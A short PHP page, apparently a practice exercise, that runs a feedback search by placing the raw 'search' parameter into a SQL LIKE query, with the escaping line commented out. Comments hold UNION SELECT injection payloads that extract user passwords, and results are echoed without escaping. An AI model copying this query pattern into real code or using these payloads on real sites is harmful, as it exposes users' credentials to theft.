<?

    // require common code
    require_once("includes/common.php");
    // $message = mysql_real_escape_string($_POST["message"]);
    $search = $_GET["search"];

    $search_query = mysql_query("SELECT message FROM feedback WHERE message LIKE '%$search%'");
    // ezezez%' union select password as message from users orderby users#
    
    // %ezezez%' union select password as message from (Select username, password from users ORDER BY username ASC) AS T1

    // redirect user to portfolio page
    // redirect("index.php");

 ?>
 
 <html>
 <? while ($search_result = mysql_fetch_array($search_query)): ?>
     <li><?=$search_result["message"]?></li>
 <? endwhile ?>
 </html>
